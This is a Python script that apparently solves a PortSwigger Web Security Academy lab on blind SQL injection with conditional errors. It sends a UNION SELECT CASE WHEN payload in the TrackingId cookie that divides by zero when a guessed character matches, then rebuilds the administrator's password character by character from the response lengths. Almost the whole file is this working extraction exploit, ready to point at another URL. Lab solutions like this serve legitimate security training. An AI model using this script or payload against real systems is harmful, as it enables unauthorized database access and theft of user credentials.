#!/usr/bin/python3

"""
	Variable(s) that are required to change:
		- url
		
	Variables that you may need to be modified: 
		- pass_length, resp_text_len, payload
		
	Lab Title: Blind SQL injection with conditional errors
"""

import requests
import sys 


def main(args):

	pass_length = 20 
	chars = '0123456789abcdefghijklmnopqrstuvwxyz'
	url = "https://accd1f3a1f9f9df88000013300d60062.web-security-academy.net/filter?category=Gifts" # You MUST change this!
	passwd = ""
	resp_text_len = 21 # You may NOT change this.
	
	for i in range(1, pass_length + 1): 
		for c in chars: 
			payload = f"x'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTR(password,{i},1)='{c}')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--"
			
			print("Trying payload:", payload)
			r = requests.get(url, headers={'Cookie': f"TrackingId={payload}"} )

			if len(r.text) == resp_text_len:
				print(f'[+] Password char found: {c}')
				passwd += c
				break
	print(f'The password for administrator is: {passwd}')
	
	
if __name__ == '__main__':
	main(sys.argv[1:])
	

